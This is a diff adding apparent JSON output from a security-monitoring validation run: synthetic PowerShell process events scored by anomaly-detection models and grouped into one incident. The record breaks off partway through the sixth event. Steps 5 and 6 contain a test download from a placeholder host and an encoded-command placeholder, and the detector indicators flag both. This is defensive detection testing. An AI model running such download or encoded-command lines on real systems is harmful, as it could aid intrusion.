@@ -1,0 +1,1641 @@
+{
+  "run_id": "SOC-VERTICAL-SLICE-FDB4B65C",
+  "success": true,
+  "incident_id": "5bf82b2f-ad74-4233-a0c5-c32c70bd42b7",
+  "seed_event_ids": [
+    "0a394fb5-9ec1-4084-919d-a9e10940edcf",
+    "701e681c-3a48-4789-b311-bfb40fb9c08f",
+    "77a0634e-b1a3-40ed-b877-ac4494d53918",
+    "c2f017a5-e431-4e5b-9dbf-7786d37842cc",
+    "c6bfb63d-e819-4af5-8f0d-3a71591ab851",
+    "dd2b0b54-7763-4441-97b2-1e23b141c286",
+    "edc1ce76-224e-4928-a51a-9e1eb40dd544",
+    "f6c1df17-e998-4891-a9ad-3021df41d2dd"
+  ],
+  "incident": {
+    "incident_id": "5bf82b2f-ad74-4233-a0c5-c32c70bd42b7",
+    "title": "Correlated PROCESS Activity",
+    "status": "NEW",
+    "correlation_score": 45,
+    "severity": "MEDIUM",
+    "categories": [
+      "PROCESS"
+    ],
+    "event_ids": [
+      "c2f017a5-e431-4e5b-9dbf-7786d37842cc",
+      "dd2b0b54-7763-4441-97b2-1e23b141c286",
+      "f6c1df17-e998-4891-a9ad-3021df41d2dd",
+      "77a0634e-b1a3-40ed-b877-ac4494d53918",
+      "c6bfb63d-e819-4af5-8f0d-3a71591ab851",
+      "701e681c-3a48-4789-b311-bfb40fb9c08f",
+      "edc1ce76-224e-4928-a51a-9e1eb40dd544",
+      "0a394fb5-9ec1-4084-919d-a9e10940edcf"
+    ],
+    "event_count": 8,
+    "timeline": [
+      {
+        "event_id": "dd2b0b54-7763-4441-97b2-1e23b141c286",
+        "event_type": "process_start",
+        "event_category": "PROCESS",
+        "source": "powershell_validation_suite",
+        "severity": "INFO",
+        "timestamp": "2026-10-06T01:41:23.539866+00:00",
+        "timestamp_unix": 1791250883.539866,
+        "device_id": "local-device",
+        "process": {
+          "pid": 992108,
+          "ppid": 991000,
+          "name": "powershell.exe",
+          "exe": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "cmdline": "powershell.exe -NoProfile -Command \"Get-Process\"",
+          "username": "sentinel-validation",
+          "create_time": 1791250823.2635014,
+          "parent_name": "explorer.exe",
+          "cpu_percent": 0.5,
+          "memory_percent": 0.2,
+          "rss_mb": 45.0,
+          "num_threads": 8,
+          "num_handles": 120,
+          "behavior_score": 5,
+          "behavior_indicators": [
+            "monitored_binary"
+          ],
+          "behavior_reasons": [
+            "Security-relevant Windows utility observed"
+          ],
+          "statistical_score": 0,
+          "statistical_indicators": [],
+          "isolation_forest": {
+            "available": true,
+            "model_name": "sentinelx_process_isolation_forest",
+            "model_version": "v1",
+            "schema_version": "process_behavior_v1",
+            "feature_count": 19,
+            "decision_score": 0.05170152,
+            "raw_score": -0.44829848,
+            "model_prediction": 1,
+            "model_outlier": false,
+            "anomaly_confidence": 27.12,
+            "anomaly_label": "NORMAL",
+            "severity": "INFO",
+            "should_alert": false,
+            "feature_deviations": [
+              {
+                "feature": "is_script_interpreter",
+                "value": 1.0,
+                "baseline_mean": 0.0281,
+                "baseline_std": 0.1653,
+                "deviation_std": 5.8789
+              },
+              {
+                "feature": "recent_event_count",
+                "value": 1.0,
+                "baseline_mean": 7.0402,
+                "baseline_std": 9.8306,
+                "deviation_std": 0.6144
+              },
+              {
+                "feature": "num_handles",
+                "value": 120.0,
+                "baseline_mean": 464.0356,
+                "baseline_std": 579.8446,
+                "deviation_std": 0.5933
+              },
+              {
+                "feature": "is_system_path",
+                "value": 1.0,
+                "baseline_mean": 0.8592,
+                "baseline_std": 0.3478,
+                "deviation_std": 0.4049
+              },
+              {
+                "feature": "executable_path_depth",
+                "value": 6.0,
+                "baseline_mean": 5.2652,
+                "baseline_std": 2.0635,
+                "deviation_std": 0.3561
+              }
+            ],
+            "pid": 992108,
+            "process_name": "powershell.exe",
+            "parent_process_name": "explorer.exe",
+            "executable_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+          },
+          "autoencoder": {
+            "available": true,
+            "model_name": "sentinelx_process_autoencoder",
+            "model_version": "v2",
+            "hidden_activation": "tanh",
+            "schema_version": "process_behavior_v1",
+            "feature_count": 19,
+            "reconstruction_error": 0.09427327,
+            "reconstruction_region": "UPPER_5_PERCENT",
+            "anomaly_confidence": 44.72,
+            "anomaly_label": "UNUSUAL",
+            "severity": "LOW",
+            "candidate_alert": false,
+            "embedding_dimension": 4,
+            "behavior_embedding": [
+              0.96026581,
+              0.73820219,
+              0.95562452,
+              0.41089847
+            ],
+            "feature_reconstruction_errors": [
+              {
+                "feature": "command_arg_count",
+                "actual_value": 4.0,
+                "reconstructed_value": 11.002024,
+                "scaled_squared_error": 0.67766823,
+                "absolute_original_difference": 7.002024
+              },
+              {
+                "feature": "num_handles",
+                "actual_value": 120.0,
+                "reconstructed_value": 592.925979,
+                "scaled_squared_error": 0.54683524,
+                "absolute_original_difference": 472.925979
+              },
+              {
+                "feature": "command_line_length",
+                "actual_value": 48.0,
+                "reconstructed_value": 242.44398,
+                "scaled_squared_error": 0.21716566,
+                "absolute_original_difference": 194.44398
+              },
+              {
+                "feature": "recent_event_count",
+                "actual_value": 1.0,
+                "reconstructed_value": 5.886935,
+                "scaled_squared_error": 0.21510499,
+                "absolute_original_difference": 4.886935
+              },
+              {
+                "feature": "num_threads",
+                "actual_value": 8.0,
+                "reconstructed_value": 13.537934,
+                "scaled_squared_error": 0.05615009,
+                "absolute_original_difference": 5.537934
+              }
+            ],
+            "calibration": {
+              "p50": 0.01421417566516108,
+              "p90": 0.08318183402218673,
+              "p95": 0.1278470974946212,
+              "p97": 0.16416013202775295,
+              "p99": 0.23687126271753484
+            },
+            "pid": 992108,
+            "process_name": "powershell.exe",
+            "parent_process_name": "explorer.exe",
+            "executable_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+          },
+          "temporal": {
+            "state": "COLLECTING_HISTORY",
+            "available": true,
+            "depth": 1,
+            "score": null,
+            "severity": null,
+            "label": null,
+            "should_alert": null,
+            "result_id": null
+          },
+          "fusion_version": "v3",
+          "fusion_score": 14.3067,
+          "fusion_severity": "INFO",
+          "fusion_suspicious": false,
+          "fusion_should_alert": false,
+          "primary_engine": "process_threat_fusion_v3"
+        },
+        "file": {},
+        "network": {},
+        "registry": {},
+        "metadata": {
+          "detector_family": "PROCESS",
+          "detector": "POWERSHELL",
+          "scenario_name": "Temporal PowerShell Sequence Step 1",
+          "event_category": "PROCESS",
+          "device_id": "local-device",
+          "data_source": "SYNTHETIC_VALIDATION",
+          "sentinel_runtime_mode": "VALIDATION",
+          "synthetic": true,
+          "scenario_id": "P1-08-S01",
+          "validation_run_id": "SOC-VERTICAL-SLICE-FDB4B65C",
+          "provenance_graph": {
+            "processed": true,
+            "node_count": 3,
+            "edge_count": 2
+          },
+          "correlation_processed": true
+        }
+      },
+      {
+        "event_id": "f6c1df17-e998-4891-a9ad-3021df41d2dd",
+        "event_type": "process_start",
+        "event_category": "PROCESS",
+        "source": "powershell_validation_suite",
+        "severity": "INFO",
+        "timestamp": "2026-10-06T01:41:23.634771+00:00",
+        "timestamp_unix": 1791250883.634771,
+        "device_id": "local-device",
+        "process": {
+          "pid": 992108,
+          "ppid": 991000,
+          "name": "powershell.exe",
+          "exe": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "cmdline": "powershell.exe -NoProfile -Command \"Get-Service\"",
+          "username": "sentinel-validation",
+          "create_time": 1791250823.2635014,
+          "parent_name": "explorer.exe",
+          "cpu_percent": 0.5,
+          "memory_percent": 0.2,
+          "rss_mb": 45.0,
+          "num_threads": 8,
+          "num_handles": 120,
+          "behavior_score": 5,
+          "behavior_indicators": [
+            "monitored_binary"
+          ],
+          "behavior_reasons": [
+            "Security-relevant Windows utility observed"
+          ],
+          "statistical_score": 0,
+          "statistical_indicators": [],
+          "isolation_forest": {
+            "available": true,
+            "model_name": "sentinelx_process_isolation_forest",
+            "model_version": "v1",
+            "schema_version": "process_behavior_v1",
+            "feature_count": 19,
+            "decision_score": 0.05440825,
+            "raw_score": -0.44559175,
+            "model_prediction": 1,
+            "model_outlier": false,
+            "anomaly_confidence": 26.43,
+            "anomaly_label": "NORMAL",
+            "severity": "INFO",
+            "should_alert": false,
+            "feature_deviations": [
+              {
+                "feature": "is_script_interpreter",
+                "value": 1.0,
+                "baseline_mean": 0.0281,
+                "baseline_std": 0.1653,
+                "deviation_std": 5.8789
+              },
+              {
+                "feature": "num_handles",
+                "value": 120.0,
+                "baseline_mean": 464.0356,
+                "baseline_std": 579.8446,
+                "deviation_std": 0.5933
+              },
+              {
+                "feature": "recent_event_count",
+                "value": 2.0,
+                "baseline_mean": 7.0402,
+                "baseline_std": 9.8306,
+                "deviation_std": 0.5127
+              },
+              {
+                "feature": "is_system_path",
+                "value": 1.0,
+                "baseline_mean": 0.8592,
+                "baseline_std": 0.3478,
+                "deviation_std": 0.4049
+              },
+              {
+                "feature": "executable_path_depth",
+                "value": 6.0,
+                "baseline_mean": 5.2652,
+                "baseline_std": 2.0635,
+                "deviation_std": 0.3561
+              }
+            ],
+            "pid": 992108,
+            "process_name": "powershell.exe",
+            "parent_process_name": "explorer.exe",
+            "executable_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+          },
+          "autoencoder": {
+            "available": true,
+            "model_name": "sentinelx_process_autoencoder",
+            "model_version": "v2",
+            "hidden_activation": "tanh",
+            "schema_version": "process_behavior_v1",
+            "feature_count": 19,
+            "reconstruction_error": 0.0886720283,
+            "reconstruction_region": "UPPER_5_PERCENT",
+            "anomaly_confidence": 42.34,
+            "anomaly_label": "UNUSUAL",
+            "severity": "LOW",
+            "candidate_alert": false,
+            "embedding_dimension": 4,
+            "behavior_embedding": [
+              0.96083063,
+              0.73827032,
+              0.95549874,
+              0.40911462
+            ],
+            "feature_reconstruction_errors": [
+              {
+                "feature": "command_arg_count",
+                "actual_value": 4.0,
+                "reconstructed_value": 10.972422,
+                "scaled_squared_error": 0.67195048,
+                "absolute_original_difference": 6.972422
+              },
+              {
+                "feature": "num_handles",
+                "actual_value": 120.0,
+                "reconstructed_value": 584.747164,
+                "scaled_squared_error": 0.52808478,
+                "absolute_original_difference": 464.747164
+              },
+              {
+                "feature": "command_line_length",
+                "actual_value": 48.0,
+                "reconstructed_value": 241.075327,
+                "scaled_squared_error": 0.21411924,
+                "absolute_original_difference": 193.075327
+              },
+              {
+                "feature": "recent_event_count",
+                "actual_value": 2.0,
+                "reconstructed_value": 5.9718,
+                "scaled_squared_error": 0.14208625,
+                "absolute_original_difference": 3.9718
+              },
+              {
+                "feature": "num_threads",
+                "actual_value": 8.0,
+                "reconstructed_value": 13.309436,
+                "scaled_squared_error": 0.05161212,
+                "absolute_original_difference": 5.309436
+              }
+            ],
+            "calibration": {
+              "p50": 0.01421417566516108,
+              "p90": 0.08318183402218673,
+              "p95": 0.1278470974946212,
+              "p97": 0.16416013202775295,
+              "p99": 0.23687126271753484
+            },
+            "pid": 992108,
+            "process_name": "powershell.exe",
+            "parent_process_name": "explorer.exe",
+            "executable_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+          },
+          "temporal": {
+            "state": "COLLECTING_HISTORY",
+            "available": true,
+            "depth": 2,
+            "score": null,
+            "severity": null,
+            "label": null,
+            "should_alert": null,
+            "result_id": null
+          },
+          "fusion_version": "v3",
+          "fusion_score": 13.7967,
+          "fusion_severity": "INFO",
+          "fusion_suspicious": false,
+          "fusion_should_alert": false,
+          "primary_engine": "process_threat_fusion_v3"
+        },
+        "file": {},
+        "network": {},
+        "registry": {},
+        "metadata": {
+          "detector_family": "PROCESS",
+          "detector": "POWERSHELL",
+          "scenario_name": "Temporal PowerShell Sequence Step 2",
+          "event_category": "PROCESS",
+          "device_id": "local-device",
+          "data_source": "SYNTHETIC_VALIDATION",
+          "sentinel_runtime_mode": "VALIDATION",
+          "synthetic": true,
+          "scenario_id": "P1-08-S02",
+          "validation_run_id": "SOC-VERTICAL-SLICE-FDB4B65C",
+          "provenance_graph": {
+            "processed": true,
+            "node_count": 3,
+            "edge_count": 2
+          },
+          "correlation_processed": true
+        }
+      },
+      {
+        "event_id": "77a0634e-b1a3-40ed-b877-ac4494d53918",
+        "event_type": "process_start",
+        "event_category": "PROCESS",
+        "source": "powershell_validation_suite",
+        "severity": "INFO",
+        "timestamp": "2026-10-06T01:41:23.737109+00:00",
+        "timestamp_unix": 1791250883.737109,
+        "device_id": "local-device",
+        "process": {
+          "pid": 992108,
+          "ppid": 991000,
+          "name": "powershell.exe",
+          "exe": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "cmdline": "powershell.exe -NoProfile -Command \"Get-Date\"",
+          "username": "sentinel-validation",
+          "create_time": 1791250823.2635014,
+          "parent_name": "explorer.exe",
+          "cpu_percent": 0.5,
+          "memory_percent": 0.2,
+          "rss_mb": 45.0,
+          "num_threads": 8,
+          "num_handles": 120,
+          "behavior_score": 5,
+          "behavior_indicators": [
+            "monitored_binary"
+          ],
+          "behavior_reasons": [
+            "Security-relevant Windows utility observed"
+          ],
+          "statistical_score": 0,
+          "statistical_indicators": [],
+          "isolation_forest": {
+            "available": true,
+            "model_name": "sentinelx_process_isolation_forest",
+            "model_version": "v1",
+            "schema_version": "process_behavior_v1",
+            "feature_count": 19,
+            "decision_score": 0.05416063,
+            "raw_score": -0.44583937,
+            "model_prediction": 1,
+            "model_outlier": false,
+            "anomaly_confidence": 26.49,
+            "anomaly_label": "NORMAL",
+            "severity": "INFO",
+            "should_alert": false,
+            "feature_deviations": [
+              {
+                "feature": "is_script_interpreter",
+                "value": 1.0,
+                "baseline_mean": 0.0281,
+                "baseline_std": 0.1653,
+                "deviation_std": 5.8789
+              },
+              {
+                "feature": "num_handles",
+                "value": 120.0,
+                "baseline_mean": 464.0356,
+                "baseline_std": 579.8446,
+                "deviation_std": 0.5933
+              },
+              {
+                "feature": "recent_event_count",
+                "value": 3.0,
+                "baseline_mean": 7.0402,
+                "baseline_std": 9.8306,
+                "deviation_std": 0.411
+              },
+              {
+                "feature": "is_system_path",
+                "value": 1.0,
+                "baseline_mean": 0.8592,
+                "baseline_std": 0.3478,
+                "deviation_std": 0.4049
+              },
+              {
+                "feature": "executable_path_depth",
+                "value": 6.0,
+                "baseline_mean": 5.2652,
+                "baseline_std": 2.0635,
+                "deviation_std": 0.3561
+              }
+            ],
+            "pid": 992108,
+            "process_name": "powershell.exe",
+            "parent_process_name": "explorer.exe",
+            "executable_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+          },
+          "autoencoder": {
+            "available": true,
+            "model_name": "sentinelx_process_autoencoder",
+            "model_version": "v2",
+            "hidden_activation": "tanh",
+            "schema_version": "process_behavior_v1",
+            "feature_count": 19,
+            "reconstruction_error": 0.0838225728,
+            "reconstruction_region": "UPPER_5_PERCENT",
+            "anomaly_confidence": 40.27,
+            "anomaly_label": "UNUSUAL",
+            "severity": "LOW",
+            "candidate_alert": false,
+            "embedding_dimension": 4,
+            "behavior_embedding": [
+              0.96136229,
+              0.73842442,
+              0.95535099,
+              0.40663252
+            ],
+            "feature_reconstruction_errors": [
+              {
+                "feature": "command_arg_count",
+                "actual_value": 4.0,
+                "reconstructed_value": 10.925108,
+                "scaled_squared_error": 0.66286181,
+                "absolute_original_difference": 6.925108
+              },
+              {
+                "feature": "num_handles",
+                "actual_value": 120.0,
+                "reconstructed_value": 574.656861,
+                "scaled_squared_error": 0.50540281,
+                "absolute_original_difference": 454.656861
+              },
+              {
+                "feature": "command_line_length",
+                "actual_value": 45.0,
+                "reconstructed_value": 238.907184,
+                "scaled_squared_error": 0.21596826,
+                "absolute_original_difference": 193.907184
+              },
+              {
+                "feature": "recent_event_count",
+                "actual_value": 3.0,
+                "reconstructed_value": 6.072385,
+                "scaled_squared_error": 0.08502149,
+                "absolute_original_difference": 3.072385
+              },
+              {
+                "feature": "num_threads",
+                "actual_value": 8.0,
+                "reconstructed_value": 13.033501,
+                "scaled_squared_error": 0.04638688,
+                "absolute_original_difference": 5.033501
+              }
+            ],
+            "calibration": {
+              "p50": 0.01421417566516108,
+              "p90": 0.08318183402218673,
+              "p95": 0.1278470974946212,
+              "p97": 0.16416013202775295,
+              "p99": 0.23687126271753484
+            },
+            "pid": 992108,
+            "process_name": "powershell.exe",
+            "parent_process_name": "explorer.exe",
+            "executable_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+          },
+          "temporal": {
+            "state": "COLLECTING_HISTORY",
+            "available": true,
+            "depth": 3,
+            "score": null,
+            "severity": null,
+            "label": null,
+            "should_alert": null,
+            "result_id": null
+          },
+          "fusion_version": "v3",
+          "fusion_score": 13.46,
+          "fusion_severity": "INFO",
+          "fusion_suspicious": false,
+          "fusion_should_alert": false,
+          "primary_engine": "process_threat_fusion_v3"
+        },
+        "file": {},
+        "network": {},
+        "registry": {},
+        "metadata": {
+          "detector_family": "PROCESS",
+          "detector": "POWERSHELL",
+          "scenario_name": "Temporal PowerShell Sequence Step 3",
+          "event_category": "PROCESS",
+          "device_id": "local-device",
+          "data_source": "SYNTHETIC_VALIDATION",
+          "sentinel_runtime_mode": "VALIDATION",
+          "synthetic": true,
+          "scenario_id": "P1-08-S03",
+          "validation_run_id": "SOC-VERTICAL-SLICE-FDB4B65C",
+          "provenance_graph": {
+            "processed": true,
+            "node_count": 3,
+            "edge_count": 2
+          },
+          "correlation_processed": true
+        }
+      },
+      {
+        "event_id": "c6bfb63d-e819-4af5-8f0d-3a71591ab851",
+        "event_type": "process_start",
+        "event_category": "PROCESS",
+        "source": "powershell_validation_suite",
+        "severity": "INFO",
+        "timestamp": "2026-10-06T01:41:23.834191+00:00",
+        "timestamp_unix": 1791250883.834191,
+        "device_id": "local-device",
+        "process": {
+          "pid": 992108,
+          "ppid": 991000,
+          "name": "powershell.exe",
+          "exe": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "cmdline": "powershell.exe -NoProfile -Command \"Get-ChildItem C:\\Temp\"",
+          "username": "sentinel-validation",
+          "create_time": 1791250823.2635014,
+          "parent_name": "explorer.exe",
+          "cpu_percent": 0.5,
+          "memory_percent": 0.2,
+          "rss_mb": 45.0,
+          "num_threads": 8,
+          "num_handles": 120,
+          "behavior_score": 5,
+          "behavior_indicators": [
+            "monitored_binary"
+          ],
+          "behavior_reasons": [
+            "Security-relevant Windows utility observed"
+          ],
+          "statistical_score": 0,
+          "statistical_indicators": [],
+          "isolation_forest": {
+            "available": true,
+            "model_name": "sentinelx_process_isolation_forest",
+            "model_version": "v1",
+            "schema_version": "process_behavior_v1",
+            "feature_count": 19,
+            "decision_score": 0.05439576,
+            "raw_score": -0.44560424,
+            "model_prediction": 1,
+            "model_outlier": false,
+            "anomaly_confidence": 26.43,
+            "anomaly_label": "NORMAL",
+            "severity": "INFO",
+            "should_alert": false,
+            "feature_deviations": [
+              {
+                "feature": "is_script_interpreter",
+                "value": 1.0,
+                "baseline_mean": 0.0281,
+                "baseline_std": 0.1653,
+                "deviation_std": 5.8789
+              },
+              {
+                "feature": "num_handles",
+                "value": 120.0,
+                "baseline_mean": 464.0356,
+                "baseline_std": 579.8446,
+                "deviation_std": 0.5933
+              },
+              {
+                "feature": "is_system_path",
+                "value": 1.0,
+                "baseline_mean": 0.8592,
+                "baseline_std": 0.3478,
+                "deviation_std": 0.4049
+              },
+              {
+                "feature": "executable_path_depth",
+                "value": 6.0,
+                "baseline_mean": 5.2652,
+                "baseline_std": 2.0635,
+                "deviation_std": 0.3561
+              },
+              {
+                "feature": "is_user_profile_path",
+                "value": 0.0,
+                "baseline_mean": 0.0874,
+                "baseline_std": 0.2824,
+                "deviation_std": 0.3094
+              }
+            ],
+            "pid": 992108,
+            "process_name": "powershell.exe",
+            "parent_process_name": "explorer.exe",
+            "executable_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+          },
+          "autoencoder": {
+            "available": true,
+            "model_name": "sentinelx_process_autoencoder",
+            "model_version": "v2",
+            "hidden_activation": "tanh",
+            "schema_version": "process_behavior_v1",
+            "feature_count": 19,
+            "reconstruction_error": 0.0694291976,
+            "reconstruction_region": "NORMAL_BASELINE",
+            "anomaly_confidence": 35.21,
+            "anomaly_label": "NORMAL",
+            "severity": "INFO",
+            "candidate_alert": false,
+            "embedding_dimension": 4,
+            "behavior_embedding": [
+              0.96224064,
+              0.7354419,
+              0.95613992,
+              0.40256053
+            ],
+            "feature_reconstruction_errors": [
+              {
+                "feature": "command_arg_count",
+                "actual_value": 5.0,
+                "reconstructed_value": 11.069228,
+                "scaled_squared_error": 0.50913955,
+                "absolute_original_difference": 6.069228
+              },
+              {
+                "feature": "num_handles",
+                "actual_value": 120.0,
+                "reconstructed_value": 552.470358,
+                "scaled_squared_error": 0.45728067,
+                "absolute_original_difference": 432.470358
+              },
+              {
+                "feature": "command_line_length",
+                "actual_value": 58.0,
+                "reconstructed_value": 245.857238,
+                "scaled_squared_error": 0.20270199,
+                "absolute_original_difference": 187.857238
+              },
+              {
+                "feature": "recent_event_count",
+                "actual_value": 4.0,
+                "reconstructed_value": 6.213349,
+                "scaled_squared_error": 0.04412422,
+                "absolute_original_difference": 2.213349
+              },
+              {
+                "feature": "num_threads",
+                "actual_value": 8.0,
+                "reconstructed_value": 12.33577,
+                "scaled_squared_error": 0.03441814,
+                "absolute_original_difference": 4.33577
+              }
+            ],
+            "calibration": {
+              "p50": 0.01421417566516108,
+              "p90": 0.08318183402218673,
+              "p95": 0.1278470974946212,
+              "p97": 0.16416013202775295,
+              "p99": 0.23687126271753484
+            },
+            "pid": 992108,
+            "process_name": "powershell.exe",
+            "parent_process_name": "explorer.exe",
+            "executable_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+          },
+          "temporal": {
+            "state": "COLLECTING_HISTORY",
+            "available": true,
+            "depth": 4,
+            "score": null,
+            "severity": null,
+            "label": null,
+            "should_alert": null,
+            "result_id": null
+          },
+          "fusion_version": "v3",
+          "fusion_score": 12.6067,
+          "fusion_severity": "INFO",
+          "fusion_suspicious": false,
+          "fusion_should_alert": false,
+          "primary_engine": "process_threat_fusion_v3"
+        },
+        "file": {},
+        "network": {},
+        "registry": {},
+        "metadata": {
+          "detector_family": "PROCESS",
+          "detector": "POWERSHELL",
+          "scenario_name": "Temporal PowerShell Sequence Step 4",
+          "event_category": "PROCESS",
+          "device_id": "local-device",
+          "data_source": "SYNTHETIC_VALIDATION",
+          "sentinel_runtime_mode": "VALIDATION",
+          "synthetic": true,
+          "scenario_id": "P1-08-S04",
+          "validation_run_id": "SOC-VERTICAL-SLICE-FDB4B65C",
+          "provenance_graph": {
+            "processed": true,
+            "node_count": 3,
+            "edge_count": 2
+          },
+          "correlation_processed": true
+        }
+      },
+      {
+        "event_id": "701e681c-3a48-4789-b311-bfb40fb9c08f",
+        "event_type": "process_start",
+        "event_category": "PROCESS",
+        "source": "powershell_validation_suite",
+        "severity": "LOW",
+        "timestamp": "2026-10-06T01:41:23.938573+00:00",
+        "timestamp_unix": 1791250883.938573,
+        "device_id": "local-device",
+        "process": {
+          "pid": 992108,
+          "ppid": 991000,
+          "name": "powershell.exe",
+          "exe": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "cmdline": "powershell.exe -NoProfile -Command \"Invoke-WebRequest https://example.invalid/a.txt -OutFile C:\\Temp\\a.txt\"",
+          "username": "sentinel-validation",
+          "create_time": 1791250823.2635014,
+          "parent_name": "explorer.exe",
+          "cpu_percent": 0.5,
+          "memory_percent": 0.2,
+          "rss_mb": 45.0,
+          "num_threads": 8,
+          "num_handles": 120,
+          "behavior_score": 30,
+          "behavior_indicators": [
+            "monitored_binary",
+            "command:invoke-webrequest",
+            "script_network_reference"
+          ],
+          "behavior_reasons": [
+            "Security-relevant Windows utility observed",
+            "Command-line indicator observed: invoke-webrequest",
+            "Script or command interpreter contains a network URL in its command line"
+          ],
+          "statistical_score": 0,
+          "statistical_indicators": [],
+          "isolation_forest": {
+            "available": true,
+            "model_name": "sentinelx_process_isolation_forest",
+            "model_version": "v1",
+            "schema_version": "process_behavior_v1",
+            "feature_count": 19,
+            "decision_score": 0.05128441,
+            "raw_score": -0.44871559,
+            "model_prediction": 1,
+            "model_outlier": false,
+            "anomaly_confidence": 27.23,
+            "anomaly_label": "NORMAL",
+            "severity": "INFO",
+            "should_alert": false,
+            "feature_deviations": [
+              {
+                "feature": "is_script_interpreter",
+                "value": 1.0,
+                "baseline_mean": 0.0281,
+                "baseline_std": 0.1653,
+                "deviation_std": 5.8789
+              },
+              {
+                "feature": "num_handles",
+                "value": 120.0,
+                "baseline_mean": 464.0356,
+                "baseline_std": 579.8446,
+                "deviation_std": 0.5933
+              },
+              {
+                "feature": "is_system_path",
+                "value": 1.0,
+                "baseline_mean": 0.8592,
+                "baseline_std": 0.3478,
+                "deviation_std": 0.4049
+              },
+              {
+                "feature": "executable_path_depth",
+                "value": 6.0,
+                "baseline_mean": 5.2652,
+                "baseline_std": 2.0635,
+                "deviation_std": 0.3561
+              },
+              {
+                "feature": "command_arg_count",
+                "value": 7.0,
+                "baseline_mean": 4.2561,
+                "baseline_std": 7.9446,
+                "deviation_std": 0.3454
+              }
+            ],
+            "pid": 992108,
+            "process_name": "powershell.exe",
+            "parent_process_name": "explorer.exe",
+            "executable_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+          },
+          "autoencoder": {
+            "available": true,
+            "model_name": "sentinelx_process_autoencoder",
+            "model_version": "v2",
+            "hidden_activation": "tanh",
+            "schema_version": "process_behavior_v1",
+            "feature_count": 19,
+            "reconstruction_error": 0.0496135808,
+            "reconstruction_region": "NORMAL_BASELINE",
+            "anomaly_confidence": 29.75,
+            "anomaly_label": "NORMAL",
+            "severity": "INFO",
+            "candidate_alert": false,
+            "embedding_dimension": 4,
+            "behavior_embedding": [
+              0.96360948,
+              0.72827152,
+              0.95792608,
+              0.40067838
+            ],
+            "feature_reconstruction_errors": [
+              {
+                "feature": "num_handles",
+                "actual_value": 120.0,
+                "reconstructed_value": 528.068497,
+                "scaled_squared_error": 0.40713299,
+                "absolute_original_difference": 408.068497
+              },
+              {
+                "feature": "command_arg_count",
+                "actual_value": 7.0,
+                "reconstructed_value": 11.527192,
+                "scaled_squared_error": 0.28328776,
+                "absolute_original_difference": 4.527192
+              },
+              {
+                "feature": "command_line_length",
+                "actual_value": 107.0,
+                "reconstructed_value": 267.503576,
+                "scaled_squared_error": 0.14796928,
+                "absolute_original_difference": 160.503576
+              },
+              {
+                "feature": "num_threads",
+                "actual_value": 8.0,
+                "reconstructed_value": 11.431817,
+                "scaled_squared_error": 0.0215627,
+                "absolute_original_difference": 3.431817
+              },
+              {
+                "feature": "recent_event_count",
+                "actual_value": 5.0,
+                "reconstructed_value": 6.314134,
+                "scaled_squared_error": 0.01555453,
+                "absolute_original_difference": 1.314134
+              }
+            ],
+            "calibration": {
+              "p50": 0.01421417566516108,
+              "p90": 0.08318183402218673,
+              "p95": 0.1278470974946212,
+              "p97": 0.16416013202775295,
+              "p99": 0.23687126271753484
+            },
+            "pid": 992108,
+            "process_name": "powershell.exe",
+            "parent_process_name": "explorer.exe",
+            "executable_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+          },
+          "temporal": {
+            "state": "COLLECTING_HISTORY",
+            "available": true,
+            "depth": 5,
+            "score": null,
+            "severity": null,
+            "label": null,
+            "should_alert": null,
+            "result_id": null
+          },
+          "fusion_version": "v3",
+          "fusion_score": 23.4967,
+          "fusion_severity": "LOW",
+          "fusion_suspicious": false,
+          "fusion_should_alert": false,
+          "primary_engine": "process_threat_fusion_v3"
+        },
+        "file": {},
+        "network": {},
+        "registry": {},
+        "metadata": {
+          "detector_family": "PROCESS",
+          "detector": "POWERSHELL",
+          "scenario_name": "Temporal PowerShell Sequence Step 5",
+          "event_category": "PROCESS",
+          "device_id": "local-device",
+          "data_source": "SYNTHETIC_VALIDATION",
+          "sentinel_runtime_mode": "VALIDATION",
+          "synthetic": true,
+          "scenario_id": "P1-08-S05",
+          "validation_run_id": "SOC-VERTICAL-SLICE-FDB4B65C",
+          "provenance_graph": {
+            "processed": true,
+            "node_count": 3,
+            "edge_count": 2
+          },
+          "correlation_processed": true
+        }
+      },
+      {
+        "event_id": "edc1ce76-224e-4928-a51a-9e1eb40dd544",
+        "event_type": "process_start",
+        "event_category": "PROCESS",
+        "source": "powershell_validation_suite",
+        "severity": "LOW",
+        "timestamp": "2026-10-06T01:41:24.037138+00:00",
+        "timestamp_unix": 1791250884.037138,
+        "device_id": "local-device",
+        "process": {
+          "pid": 992108,
+          "ppid": 991000,
+          "name": "powershell.exe",
+          "exe": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "cmdline": "powershell.exe -NoProfile -EncodedCommand SYNTHETIC_TEMPORAL_A",
+          "username": "sentinel-validation",
+          "create_time": 1791250823.2635014,
+          "parent_name": "explorer.exe",
+          "cpu_percent": 0.5,
+          "memory_percent": 0.2,
+          "rss_mb": 45.0,
+          "num_threads": 8,
+          "num_handles": 120,
+          "behavior_score": 35,
+          "behavior_indicators": [
+            "monitored_binary",
+            "command:-encodedcommand"
+          ],
+          "behavior_reasons": [
+            "Security-relevant Windows utility observed",
+            "Command-line indicator observed: -encodedcommand"
+          ],
+          "statistical_score": 0,
+          "statistical_indicators": [],
+          "isolation_forest": {
+            "available": true,
+            "model_name": "sentinelx_process_isolation_forest",
+            "model_version": "v1",
+            "schema_version": "process_behavior_v1",
